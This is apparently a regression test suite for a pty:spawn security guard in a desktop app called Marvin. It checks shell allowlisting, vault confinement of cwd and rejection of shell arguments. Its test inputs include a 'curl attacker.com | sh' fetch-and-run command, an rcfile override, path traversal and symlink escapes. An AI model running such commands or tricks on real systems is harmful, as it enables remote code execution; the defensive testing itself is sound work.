/**
 * Regression tests for pty:spawn RCE mitigation.
 * Issue #65: pty:spawn accepted arbitrary shell/args/cwd from renderer — RCE primitive.
 *
 * Fix contract:
 *   - Shell must be in the allowlist → MARVIN_SHELL_NOT_ALLOWED
 *   - cwd must be inside activeVaultPath → MARVIN_OUTSIDE_VAULT
 *   - Any args are forbidden for generic shells → MARVIN_SHELL_ARGS_FORBIDDEN
 *   - Agent shells (claude, codex, etc.) allow arbitrary args
 *   - agent:detect only resolves allowlisted agent names → MARVIN_AGENT_NOT_ALLOWED
 *   - pty.spawn errors are wrapped opaquely → MARVIN_PTY_SPAWN_FAILED
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import fs from 'node:fs/promises'
import path from 'node:path'
import os from 'node:os'

import {
  assertPtySpawnAllowed,
  registerDynamicShell,
  type PtySpawnOpts,
} from '../pty-spawn-guard.js'

// CRITICAL-1: agent:detect name allowlist — extracted to agent-detect-guard.ts
import { assertAgentDetectAllowed, getDynamicShells } from '../agent-detect-guard.js'

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

let vault: string

async function setup(): Promise<void> {
  const raw = await fs.mkdtemp(path.join(os.tmpdir(), 'marvin-pty-vault-'))
  vault = await fs.realpath(raw)
}

async function teardown(): Promise<void> {
  await fs.rm(vault, { recursive: true, force: true })
}

function opts(overrides: Partial<PtySpawnOpts> & Pick<PtySpawnOpts, 'shell' | 'cwd'>): PtySpawnOpts {
  return {
    id: 'test-id',
    cols: 80,
    rows: 24,
    args: [],
    ...overrides,
  }
}

// ---------------------------------------------------------------------------
// 1. Shell not in allowlist → MARVIN_SHELL_NOT_ALLOWED
// ---------------------------------------------------------------------------

describe('pty:spawn — shell allowlist', () => {
  beforeEach(setup)
  afterEach(teardown)

  it('rejects /usr/bin/python3 — not in allowlist', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/usr/bin/python3', cwd: vault }))
    ).rejects.toThrow('MARVIN_SHELL_NOT_ALLOWED')
  })

  it('rejects /usr/bin/python — not in allowlist', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/usr/bin/python', cwd: vault }))
    ).rejects.toThrow('MARVIN_SHELL_NOT_ALLOWED')
  })

  it('rejects /usr/bin/perl — not in allowlist', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/usr/bin/perl', cwd: vault }))
    ).rejects.toThrow('MARVIN_SHELL_NOT_ALLOWED')
  })

  it('rejects /usr/bin/ruby — not in allowlist', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/usr/bin/ruby', cwd: vault }))
    ).rejects.toThrow('MARVIN_SHELL_NOT_ALLOWED')
  })

  it('rejects arbitrary binary path — not in allowlist', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/tmp/evil-binary', cwd: vault }))
    ).rejects.toThrow('MARVIN_SHELL_NOT_ALLOWED')
  })

  it('rejects empty string as shell', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '', cwd: vault }))
    ).rejects.toThrow('MARVIN_SHELL_NOT_ALLOWED')
  })
})

// ---------------------------------------------------------------------------
// 2. cwd outside vault → MARVIN_OUTSIDE_VAULT
// ---------------------------------------------------------------------------

describe('pty:spawn — cwd must be inside vault', () => {
  beforeEach(setup)
  afterEach(teardown)

  it('rejects cwd=/etc — absolute path outside vault', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: '/etc' }))
    ).rejects.toThrow('MARVIN_OUTSIDE_VAULT')
  })

  it('rejects cwd=/ — filesystem root', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: '/' }))
    ).rejects.toThrow('MARVIN_OUTSIDE_VAULT')
  })

  it('rejects cwd=<vault>/../escape — path traversal', async () => {
    const traversal = path.join(vault, '..', 'escape')
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: traversal }))
    ).rejects.toThrow('MARVIN_OUTSIDE_VAULT')
  })

  it('rejects cwd=<vault>/sub/../../escape — deep traversal', async () => {
    const traversal = path.join(vault, 'sub', '..', '..', 'escape')
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: traversal }))
    ).rejects.toThrow('MARVIN_OUTSIDE_VAULT')
  })

  it('rejects cwd with null byte', async () => {
    const nullCwd = vault + '\0evil'
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: nullCwd }))
    ).rejects.toThrow('MARVIN_OUTSIDE_VAULT')
  })

  it('rejects symlinked cwd pointing outside vault', async () => {
    const outside = await fs.mkdtemp(path.join(os.tmpdir(), 'marvin-pty-outside-'))
    try {
      const symlinkCwd = path.join(vault, 'linked-cwd')
      await fs.symlink(outside, symlinkCwd)

      await expect(
        assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: symlinkCwd }))
      ).rejects.toThrow('MARVIN_OUTSIDE_VAULT')
    } finally {
      await fs.rm(outside, { recursive: true, force: true })
    }
  })
})

// ---------------------------------------------------------------------------
// 3. args sanitization — -c flag forbidden for generic shells
// ---------------------------------------------------------------------------

describe('pty:spawn — args sanitization for generic shells', () => {
  beforeEach(setup)
  afterEach(teardown)

  it('rejects /bin/sh with args [-c, echo pwn]', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: vault, args: ['-c', 'echo pwn'] }))
    ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
  })

  it('rejects /bin/bash with args [-c, curl attacker.com | sh]', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/bin/bash', cwd: vault, args: ['-c', 'curl attacker.com | sh'] }))
    ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
  })

  it('rejects /bin/zsh with args [-c, malicious]', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/bin/zsh', cwd: vault, args: ['-c', 'malicious'] }))
    ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
  })

  it('rejects -c as first arg even with trailing args', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: vault, args: ['-c', 'cmd', 'extra'] }))
    ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
  })
})

// ---------------------------------------------------------------------------
// 4. Happy path — generic shells with no args
// ---------------------------------------------------------------------------

describe('pty:spawn — happy path: allowed shells in vault', () => {
  beforeEach(setup)
  afterEach(teardown)

  it('accepts /bin/zsh with empty args inside vault — returns {shell, cwd}', async () => {
    const result = await assertPtySpawnAllowed(vault, opts({ shell: '/bin/zsh', cwd: vault }))
    expect(result).toMatchObject({ shell: '/bin/zsh' })
  })

  it('accepts /bin/bash with empty args inside vault', async () => {
    const result = await assertPtySpawnAllowed(vault, opts({ shell: '/bin/bash', cwd: vault }))
    expect(result).toMatchObject({ shell: '/bin/bash' })
  })

  it('accepts /bin/sh with empty args inside vault', async () => {
    const result = await assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: vault }))
    expect(result).toMatchObject({ shell: '/bin/sh' })
  })

  it('accepts cwd that is a subdirectory of the vault', async () => {
    const subdir = path.join(vault, 'project', 'src')
    await fs.mkdir(subdir, { recursive: true })

    const result = await assertPtySpawnAllowed(vault, opts({ shell: '/bin/zsh', cwd: subdir }))
    expect(result).toMatchObject({ shell: '/bin/zsh' })
  })

  it('returned cwd is realpath-resolved (not lexical)', async () => {
    const result = await assertPtySpawnAllowed(vault, opts({ shell: '/bin/zsh', cwd: vault }))
    const expected = await fs.realpath(vault)
    expect(result.cwd).toBe(expected)
  })
})

// ---------------------------------------------------------------------------
// 5. Happy path — agent shells allow arbitrary args
// ---------------------------------------------------------------------------

describe('pty:spawn — happy path: agent shells allow arbitrary args', () => {
  beforeEach(setup)
  afterEach(teardown)

  it('accepts claude binary pre-registered via registerDynamicShell with semantic args', async () => {
    // Simulates what agent:detect does at runtime: detectBinary resolves the path,
    // then registerDynamicShell adds it to the allowed set before pty:spawn is called.
    const fakeClaude = path.join(vault, 'claude')
    await fs.writeFile(fakeClaude, '#!/bin/sh\necho claude', 'utf8')
    await fs.chmod(fakeClaude, 0o755)
    registerDynamicShell(fakeClaude)

    const result = await assertPtySpawnAllowed(
      vault,
      opts({ shell: fakeClaude, cwd: vault, args: ['--dangerously-skip-permissions'] })
    )
    expect(result).toMatchObject({ shell: fakeClaude })
  })

  it('accepts codex binary pre-registered via registerDynamicShell with arbitrary args', async () => {
    const fakeCodex = path.join(vault, 'codex')
    await fs.writeFile(fakeCodex, '#!/bin/sh\necho codex', 'utf8')
    await fs.chmod(fakeCodex, 0o755)
    registerDynamicShell(fakeCodex)

    const result = await assertPtySpawnAllowed(
      vault,
      opts({ shell: fakeCodex, cwd: vault, args: ['--model', 'gpt-4o'] })
    )
    expect(result).toMatchObject({ shell: fakeCodex })
  })
})

// ---------------------------------------------------------------------------
// 6. Combined: shell not allowed takes priority over other checks
// ---------------------------------------------------------------------------

describe('pty:spawn — error priority', () => {
  beforeEach(setup)
  afterEach(teardown)

  it('shell not allowed error is thrown even when cwd is also invalid', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/usr/bin/python3', cwd: '/etc' }))
    ).rejects.toThrow('MARVIN_SHELL_NOT_ALLOWED')
  })
})

// ---------------------------------------------------------------------------
// HIGH-1: GENERIC_SHELLS accept zero args — any arg is a potential inline exec
// ---------------------------------------------------------------------------

describe('pty:spawn — HIGH-1: all args rejected for generic shells', () => {
  beforeEach(setup)
  afterEach(teardown)

  it('rejects args: [-il] — combined interactive+login flags', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/bin/bash', cwd: vault, args: ['-il'] }))
    ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
  })

  it('rejects args: [-li] — combined login+interactive flags', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/bin/bash', cwd: vault, args: ['-li'] }))
    ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
  })

  it('rejects args: [-ic] — combined interactive+exec flags', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/bin/zsh', cwd: vault, args: ['-ic'] }))
    ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
  })

  it('rejects args: [-s] — reads script from stdin', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: vault, args: ['-s'] }))
    ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
  })

  it('rejects args: [/some/script.sh] — positional script path', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/bin/bash', cwd: vault, args: ['/some/script.sh'] }))
    ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
  })

  it('rejects args: [--rcfile, /path] — bash init file override', async () => {
    await expect(
      assertPtySpawnAllowed(vault, opts({ shell: '/bin/bash', cwd: vault, args: ['--rcfile', '/attacker/init'] }))
    ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
  })
})

// ---------------------------------------------------------------------------
// HIGH-2: shell symlink escape — realpath must leave allowlist
// ---------------------------------------------------------------------------

describe('pty:spawn — HIGH-2: shell symlink escape', () => {
  it('rejects symlinked shell whose realpath is not in allowlist', async () => {
    // Create a fake "attacker" binary and symlink it under a trusted shell name.
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'marvin-shellsym-'))
    try {
      const vaultDir = await fs.mkdtemp(path.join(os.tmpdir(), 'marvin-shellsym-vault-'))
      try {
        const vault2 = await fs.realpath(vaultDir)
        const attacker = path.join(tmpDir, 'attacker-binary')
        await fs.writeFile(attacker, '#!/bin/sh\necho evil', 'utf8')
        await fs.chmod(attacker, 0o755)
        const fakeZsh = path.join(tmpDir, 'fake-zsh')
        await fs.symlink(attacker, fakeZsh)

        await expect(
          assertPtySpawnAllowed(vault2, opts({ shell: fakeZsh, cwd: vault2 }))
        ).rejects.toThrow('MARVIN_SHELL_NOT_ALLOWED')
      } finally {
        await fs.rm(vaultDir, { recursive: true, force: true })
      }
    } finally {
      await fs.rm(tmpDir, { recursive: true, force: true })
    }
  })
})

// ---------------------------------------------------------------------------
// HIGH-NEW: registerDynamicShell / registerDetectedAgent store realpath
//
// Brew/asdf/mise install agents as symlinks. If the Set stores the symlink
// path but assertPtySpawnAllowed does fs.realpath() before the lookup, the
// spawn would be rejected even for a legitimately detected agent.
// Fix: realpathSync at registration so both sides live in the same space.
// ---------------------------------------------------------------------------

describe('HIGH-NEW: registerDynamicShell stores realpath, not symlink path', () => {
  it('spawn succeeds when shell is a symlink whose realpath was registered', async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'marvin-regsym-'))
    try {
      const vaultDir = await fs.mkdtemp(path.join(os.tmpdir(), 'marvin-regsym-vault-'))
      try {
        const vault2 = await fs.realpath(vaultDir)
        const realBin = path.join(tmpDir, 'claude-real')
        await fs.writeFile(realBin, '#!/bin/sh\necho claude', 'utf8')
        await fs.chmod(realBin, 0o755)
        const symlink = path.join(tmpDir, 'claude-symlink')
        await fs.symlink(realBin, symlink)

        // registerDynamicShell receives the symlink path (as detectBinary returns it)
        // but must store realpathSync(symlink) so the fs.realpath lookup matches.
        registerDynamicShell(symlink)

        const result = await assertPtySpawnAllowed(vault2, opts({ shell: symlink, cwd: vault2, args: [] }))
        expect(result.shell).toBe(await fs.realpath(symlink))
      } finally {
        await fs.rm(vaultDir, { recursive: true, force: true })
      }
    } finally {
      await fs.rm(tmpDir, { recursive: true, force: true })
    }
  })
})

describe('HIGH-NEW: registerDetectedAgent stores realpath, not symlink path', () => {
  it('getDynamicShells contains realpath after registering a symlinked agent path', async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'marvin-regdet-'))
    try {
      const realBin = path.join(tmpDir, 'codex-real')
      await fs.writeFile(realBin, '#!/bin/sh\necho codex', 'utf8')
      await fs.chmod(realBin, 0o755)
      const symlink = path.join(tmpDir, 'codex-symlink')
      await fs.symlink(realBin, symlink)

      const { registerDetectedAgent, getDynamicShells: getShells } = await import('../agent-detect-guard.js')
      registerDetectedAgent(symlink)

      const expected = await fs.realpath(symlink)
      expect(getShells().has(expected)).toBe(true)
      // Symlink path itself must NOT be in the set — only realpath is stored
      expect(getShells().has(symlink)).toBe(false)
    } finally {
      await fs.rm(tmpDir, { recursive: true, force: true })
    }
  })
})

// ---------------------------------------------------------------------------
// CRITICAL-1: agent:detect name allowlist (assertAgentDetectAllowed)
//
// agent:detect must reject arbitrary binary names — only a hardcoded set of
// known agent names is permitted. Otherwise renderer can call
// agent:detect('python3') and get /usr/bin/python3 added to dynamicShells,
// turning it into an allowed pty:spawn shell.
//
// Tests import assertAgentDetectAllowed from agent-detect-guard.ts (to-be-extracted).
// ---------------------------------------------------------------------------

describe('CRITICAL-1: agent:detect — name allowlist', () => {
  it('rejects agent name "python3" — not an agent', async () => {
    expect(() => assertAgentDetectAllowed('python3')).toThrow('MARVIN_AGENT_NOT_ALLOWED')
  })

  it('rejects agent name "sh" — shell, not an agent', async () => {
    expect(() => assertAgentDetectAllowed('sh')).toThrow('MARVIN_AGENT_NOT_ALLOWED')
  })

  it('rejects agent name "curl" — arbitrary binary', async () => {
    expect(() => assertAgentDetectAllowed('curl')).toThrow('MARVIN_AGENT_NOT_ALLOWED')
  })

  it('rejects agent name with path separator', async () => {
    expect(() => assertAgentDetectAllowed('../etc/malicious')).toThrow('MARVIN_AGENT_NOT_ALLOWED')
  })

  it('accepts agent name "claude"', () => {
    expect(() => assertAgentDetectAllowed('claude')).not.toThrow()
  })

  it('accepts agent name "codex"', () => {
    expect(() => assertAgentDetectAllowed('codex')).not.toThrow()
  })
})

describe('CRITICAL-1: agent:detect — dynamicShells not poisoned on rejection', () => {
  it('dynamicShells does not contain /usr/bin/python3 after rejected detect attempt', () => {
    // Attempting to detect a non-allowed name must not add anything to dynamicShells.
    try { assertAgentDetectAllowed('python3') } catch { /* expected */ }
    const shells = getDynamicShells()
    const poisoned = [...shells].some((s) => s.includes('python'))
    expect(poisoned).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// MEDIUM: pty.spawn error envelope — opaque MARVIN_PTY_SPAWN_FAILED
//
// When pty.spawn itself throws (bad shell path, permissions, etc.) the handler
// must wrap the error opaquely. Tests verify the guard does NOT leak the
// absolute shell path in its own errors; the envelope is in the handler catch.
// We test the guard contract: assertPtySpawnAllowed throws MARVIN_SHELL_NOT_ALLOWED
// (not the raw path) when the shell is outside the allowlist.
// ---------------------------------------------------------------------------

describe('MEDIUM: error messages do not leak shell paths', () => {
  beforeEach(setup)
  afterEach(teardown)

  it('MARVIN_SHELL_NOT_ALLOWED message does not contain the rejected shell path', async () => {
    const evilShell = '/usr/bin/python3'
    const err = await assertPtySpawnAllowed(vault, opts({ shell: evilShell, cwd: vault }))
      .catch((e: Error) => e)
    expect(err).toBeInstanceOf(Error)
    expect((err as Error).message).not.toContain(evilShell)
    expect((err as Error).message).toBe('MARVIN_SHELL_NOT_ALLOWED')
  })

  it('MARVIN_OUTSIDE_VAULT message does not contain the rejected cwd path', async () => {
    const evilCwd = '/etc/sensitive'
    const err = await assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: evilCwd }))
      .catch((e: Error) => e)
    expect(err).toBeInstanceOf(Error)
    expect((err as Error).message).not.toContain(evilCwd)
    expect((err as Error).message).toBe('MARVIN_OUTSIDE_VAULT')
  })
})
